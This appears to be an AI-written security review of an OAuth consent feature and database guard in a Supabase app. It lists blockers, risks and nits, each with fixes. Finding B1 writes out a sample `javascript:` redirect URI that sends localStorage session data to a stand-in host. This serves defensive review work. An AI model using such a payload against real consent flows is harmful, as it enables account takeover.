# Review - B5a-batch (ai-mcp)

Verdict: fix-then-continue
Reviewed: 664e403f7f41d35f2bd25441d7c5a8c8b6192306
Scope: batch B5a-batch

<!-- The three lines above are read by .claude/hooks/agent-guard.mjs and
bash-guard.mjs rule 2r (lib.mjs, parseReviewHead): keep them first, one
value each, no markup. Then the sections of review.prompt.md, "Output
format". -->

Findings: 1 blocker, 6 risks, 8 nits. Diff read: `git show 664e403f` (parent
`a2b4df21`). Read-only review: no gate, no docker, no vitest ran.

The migration matches plan step 3: the same allow-list, HEAD read as GET,
exact path equality, a fixed `search_path` on both functions, `execute`
revoked from `public` and `anon` on the definer, the restrictive `for update`
and `for delete` pair on `storage.objects`, and a reversal in the order of
step 3. Fail-closed holds: a missing, numeric or malformed `session_id` reads
as false, and an empty-string `client_id` is guarded. A malformed `sub` raises
a cast error, which is also a refusal. No function takes the row type of an
allowed table (`git grep` of the migrations), so today no computed
relationship can get past the path check. The test file asserts each
acceptance row with a real check. The only vacuous branch is N5.

## Blockers

### B1 - The consent page sends the browser to any URL that Auth returns, `javascript:` included

- File: `app/src/ports/supabase.ts:1445` (`leaveFor`), which is called from
  `:1455` (approve and deny) and `:1472` (an authorization that is already
  answered, with no click).
- Failure scenario: dynamic registration is on, and the redirect URIs come
  from the app (custom schemes such as `cursor://` are accepted). Auth builds
  `redirect_url` as `redirect_uri` plus `?code=...` or `?error=access_denied`.
  Assume that Auth accepts `javascript:fetch('//x?'+localStorage.getItem(...))//`
  as a redirect URI. Then `location.assign` runs that script on the site's
  origin when the reader presses «Отказать». A suspicious app makes the
  reader press exactly that button. The script reads the app's own session
  from storage, which gives the whole account. The site sends no
  `script-src` CSP (`preview/public/_headers`). Nobody measured whether Auth
  refuses the `javascript:`, `data:` or `vbscript:` schemes. The page is the
  security boundary of the feature, so the page must not depend on that
  unmeasured fact.
- Fix: in `leaveFor`, parse the URL and refuse the protocols `javascript:`,
  `data:`, `vbscript:`, `blob:` and `file:` (answer `{ ok: false }`, or the
  `gone` arm in `details`). Keep `https:`, loopback `http:` and other custom
  schemes. Add one `supabase.test.ts` case for each arm (approve, deny,
  details `done`) with a `javascript:` `redirect_url`, and assert that
  `assign` is not called. Optional: let `appHost` give the same refusal so that
  the card never shows the address.

## Risks

### R1 - The release gate does not prove every claim of «Не сможет», and one gap bypasses the database guard

- Files: `.claude/README.md:2366-2376` (Release checklist, P1-P4);
  `app/src/lib/dict.ts:547` and `:1634` (`connectCannotLine`); both privacy
  pages; `docs/specs/META.md` section 3.
- Failure scenario: P1-P4 cover a password set, a factor enroll, the approve
  of another client and a grant revoke. The consent text and the privacy
  pages also say that the app cannot change the email or the sign-in methods.
  Step 1 proved neither of these: the email change failed on the project's
  address check, and the identity link and unlink failed for the app token
  too (`.claude/README.md:2342-2344`). The gate also does not read the grants
  list or another app's authorization details. The plan's privacy rule
  depends on these reads. Most important: no probe refreshes the client's
  refresh token at the plain `/auth/v1/token?grant_type=refresh_token`. If
  that refresh gives a token with no `client_id`, the guard returns at once,
  and the app gets the whole account through PostgREST.
- Fix: add probes to the checklist, each with the expected result
  `PASS-BLOCKED` before production: P5, an email change to a valid
  throwaway address (a pending change counts as a failure); P6, an identity
  unlink on an account with two identities; P7, the OAuth refresh token at
  the plain token endpoint is refused or keeps `client_id`; P8, `listGrants`
  and authorization details with a client token. Run P7 on the local stack
  now if it is cheap, because the guard depends on it.

### R2 - No recorded reading shows that a revoke deletes the `auth.sessions` row

- Files: `.claude/README.md:2318-2345` (step 1 results);
  `docs/decisions/2026-11-13-a-connected-app-reaches-only-the-api-s-account-scope.md:5`;
  `docs/specs/META.md:252`; both privacy pages ("its access ends at once").
- Failure scenario: plan step 1 asks for a reading of "whether PostgREST
  accepts the access token after `revokeGrant` until `exp`". The README does
  not record it. The guard stops a revoked token only when Auth deletes the
  session row. The test deletes the row itself
  (`tests/db/api-client-guard.test.mjs:309`). If `revokeGrant` revokes only
  the refresh tokens, or marks the session, the access token works for up to
  3600 s, and the privacy sentence is false.
- Fix: on the local stack (the README says that its Auth serves the OAuth
  server), approve, read the token's `session_id`, call `revokeGrant`, then
  read `auth.sessions` for that id. Record the result in "OAuth server and the
  client token". If the row stays, check `oauth_client_id` or a revoked
  marker in the guard, or change the privacy sentence.

### R3 - "Its access ends at once" is not true for Storage uploads and Realtime

- Files: `supabase/migrations/20261113120000_api_client_guard.sql:108-118`;
  `pages/src/en/privacy.html:129-130`; `pages/src/privacy.html:131-132`.
- Failure scenario: Storage and Realtime do not go through PostgREST, so the
  guard's session check does not run for them. After «Отключить», the
  unexpired token can still upload to `homebrew-art` under
  `homebrew_art_insert` (until the room is full), and an open Realtime socket
  keeps the `owner:<uid>` broadcasts until `exp`. These broadcasts are in the
  scope, but they continue after the revoke.
- Fix (recommended): add `objects_no_client_insert` as restrictive
  `for insert to authenticated with check ((select auth.jwt() ->> 'client_id')
  is null or public.api_client_session_live())`. This keeps H11's insert for a
  live client. Update the "one update and one delete" test to the three
  policies. In both privacy pages, say that a live notice connection can stay
  open for up to an hour. Alternative: narrow the privacy sentence to "within
  an hour". Trade-off: a third policy and a test change, against a weaker
  promise.

### R4 - The base `[auth.oauth_server] enabled = true` arms the production switch for any later push

- File: `supabase/config.toml:275-278`.
- Failure scenario: the gate says that production stays off until P1-P4
  pass. After the closeout squash, any `config:push -- --project prod` turns
  the server on, also a push for another task's unrelated auth change. The
  consent text then claims a bound that nobody proved.
  `config:diff`'s "only `auth.oauth_server` rows" protects only the release
  push itself.
- Fix (recommended): set the base to `enabled = false`, keep
  `[remotes.test.auth.oauth_server] enabled = true`, and make release step 4
  "set the base to `true` in a commit, then `config:push -- --project prod`".
  The local stack then serves no OAuth server. No test needs it:
  `check:db` reads the auth tables, which exist either way. Check that the
  local consent probe does not need it. Alternative: keep `true` and add a
  line to `.claude/README.md`, "Supabase configuration", that every prod push
  before the gate must first set the section to off. Trade-off: one more
  release commit, against a rule that people must remember.

### R5 - An approve or deny of an expired request gives a connection error that no retry can fix

- Files: `app/src/ports/supabase.ts:1450-1458` (`answer`);
  `app/src/components/ConnectPage.svelte:53-60`.
- Failure scenario: the reader keeps the card open after the authorization
  expires, or answers it in a second tab, then presses «Разрешить». Auth
  answers 4xx. The page toasts «Не получилось. Проверьте соединение и
  попробуйте ещё раз.», and each retry fails in the same way. The cause is
  wrong (rule 2), and the reader has no path to recover.
- Fix: in `answer`, map `appGone(error)` to a `gone` arm (`AppAnswer` gains
  `{ ok: true; gone: true }` or `{ ok: false; gone: true }`). In that case
  the page draws the expired page. Add one component test and one port test.

### R6 - The privacy pages say that the site keeps the connection only until the reader disconnects it

- Files: `pages/src/en/privacy.html:130`; `pages/src/privacy.html:132-133`.
- Failure scenario: if Auth marks `auth.oauth_consents` with `revoked_at`
  and does not delete the row (not read in this review), the record of the
  connection stays after «Отключить», until the account is deleted.
- Fix: read the columns and the row after a revoke on the local stack (one
  query, which R2's reading can include). If the row stays, write "until you
  delete the account".

## Nits

- N1 `local` - `tools/bundle-budget.mjs:37`: the comment cites the batch id
  "ai-mcp B5a" (`CLAUDE.md`, "Comments"). Keep the date and the measurement
  only.
- N2 `local` - `app/src/components/ConnectPage.svelte:107`,
  `app/src/components/AccountPage.svelte:255` and `:271`:
  `.replace('%s', value)` with a value from the app (the name, the host)
  reads `$&`, `` $` `` and `$'` as replacement patterns. A name such as
  `` $` `` copies the text of the sentence into the confirm. Use
  `.replace('%s', () => value)`.
- N3 `local` - `issues/ai-mcp/handoff.md:55`: the line "`rtk npm run
  check:fast`: see the batch's report (CHECKFAST_RESULT)" is a placeholder.
  Record the command's result (definition of done: exact commands and
  results).
- N4 `local` - `app/src/components/connectPage.test.ts:224-227`: "draws the
  not-found page" asserts only `not.toBe('Подключение приложения')`, and any
  other heading passes. Assert the not-found heading.
- N5 `local` - `tests/db/api-client-guard.test.mjs:542-558`: when
  `auth.oauth_consents` is absent, the consent half of "leaves no session and
  no OAuth consent" is vacuous. The README says that the local Auth serves the
  OAuth server, so assert `consents` is not null.
- N6 `local` - `tests/db/api-client-guard.test.mjs`: PostgREST runs a public
  function that takes an allowed table's row type as a computed field on
  `GET /<table>?select=fn`, and the path check does not see it. Add one
  enumeration assertion: no function that `authenticated` may execute takes
  the row type of a table in the GET list. Today there is none.
- N7 `local` -
  `docs/decisions/2026-11-13-a-connected-app-reaches-only-the-api-s-account-scope.md:5`
  and `docs/specs/META.md` section 3: plan-B5b-1 asked D7 to name Realtime.
  Neither file says that a client token receives the `owner:<uid>` and
  `share:` broadcasts (in the scope) until `exp`. Add one sentence. It goes
  with R3.
- N8 `deferred-scope` - `tools/bundle-budget.mjs:47`: the configured limit
  338 rests on a build with placeholder values. After the push, read CI's
  configured total. If it is 337.0 or less, the rule gives 337.

## Deviations

1. The grant row's host comes from `client.uri`, and the consent card's host
   comes from the redirect. Accepted: the grant answer of Auth has no
   redirect (measured). The consent card shows the host that matters for
   security. `FEATURES.md` says "the host of the client's own address", which
   is correct.
2. The scope list always has the email and name line. Accepted: step 1
   found both claims in every client token, also for `scope=openid`.
3. «Не сможет» and both privacy pages name the password, the email, the
   sign-in methods and other apps (owner, 2026-11-13), and the privacy pages
   name the global sign-out. Accepted as text. The gate does not prove the
   email and the sign-in methods (R1).
4. «Отключить» reads `oauth_consent_not_found` as done. Accepted: another
   tab already ended the grant. The local stack measured that this code is
   the answer.
5. `PagePort.framed()` is new, and `ProviderLogo`, `SessionLine`,
   `SignInPanel` and `providers.ts` were extracted. Accepted: the page reads
   no `window` (ports rule), and each extraction has a second real use.
6. The configured bundle was measured with placeholder values, and the limit
   is 338. Accepted, with N8.
7. Acceptance 2 (`config:diff -- --project test`) and 9 (the hosted
   `user_prefs` probe) are pending readings. Accepted. The push's CI
   `migrate-test` also shows whether the hosted `postgres` can run `alter
   role authenticator`: if it cannot, the migration fails, and the named
   fallback applies.

## Standing checks

1. Scale: checked - the plan's B5a States table against
   `tests/app/inventory.js` (consent details at 1100 and 360, longest name,
   loading, failed read, signed out, expired; apps gm1, gm2 empty, gm4
   longest name at 360, loading, failed) and the component tests (approving,
   failed answer, framed, already answered, off, 30 rows newest first, host
   as given). No grant limit exists. At 360 px the primary action is at the
   bottom of a long card, which is the approved mock (read first, then
   answer). Nothing is sticky, and the page has no input.
2. Error scenarios: checked - failed read and retry (both screens), failed
   approve or deny, revoke failure, a revoke from another tab
   (`oauth_consent_not_found`), the server off (`feature_disabled`), offline
   as a failed read, the stale bundle and the revert order (README). No
   stored row is lost by this batch's own writes. Defects: R5 (expired
   answer), R2 and R3 (a revoke that does not end access at once), and B1.
3. Consistency: checked - `FEATURES.md` rules 2, 5, 6, 7, 10, 16 and 20
   against `ConnectPage.svelte` and the account section, and the sibling
   «Способы входа» (the same panel, row shape and small ghost button). The
   departure without a confirm on a provider's «Отключить» is named. R5 is
   a rule 2 defect (a wrong cause in the toast).
4. RU/EN parity: checked - every new `dict.ts` key in both languages
   (`connect*`, `apps*`, `appDisconnect*`) has the same facts and the same
   order. The EN text uses ASCII punctuation, and the RU text uses «» as
   Russian permits. Both privacy pages have the same facts (the five scope
   lines, the global sign-out, the two cascades, the four exclusions, the
   vendor's terms, the disconnect) and the same date, 13 November 2026. No
   plurals are new. The host is shown as given in both languages.

Owner rules: checked - the owner decisions of 2026-11-13 (build on
supabase/auth#2898, the release gate P1-P4 before production, the DB guard
stays) are in `.claude/README.md`, "OAuth server and the client token",
"Release checklist", and in D7. Both homes are inside the budget for this
review. R1 widens the gate. It does not move the rule.

## Suggested next action

Send B1, R1 (P7 now and the checklist lines), R2, R3, R4, R5, R6 and the
`local` nits N1-N7 to one implementer fix pass on `claude/ai-mcp`. Then run
`check:fast`, `check:db` (the policy change of R3 and the test changes of N5
and N6), and push. No second review is needed unless R2's reading shows that
the session row stays: then the guard changes, and that change is a schema
review trigger.

## Checks still needed

- R2 and R6: on the local stack, approve, `revokeGrant`, then read
  `auth.sessions` for the token's `session_id` and the `auth.oauth_consents`
  row.
- R1 P7: an OAuth refresh token at `/auth/v1/token?grant_type=refresh_token`
  (local stack and test project), and the `client_id` claim of the answer.
- B1: whether Auth's dynamic registration accepts a `javascript:` redirect
  URI. The fix is needed either way. The reading tells how urgent the
  hosted test project is.
- Acceptance 2 and 9 (pending, owner token and `migrate-test`).
- CI's configured bundle total after the push (N8).
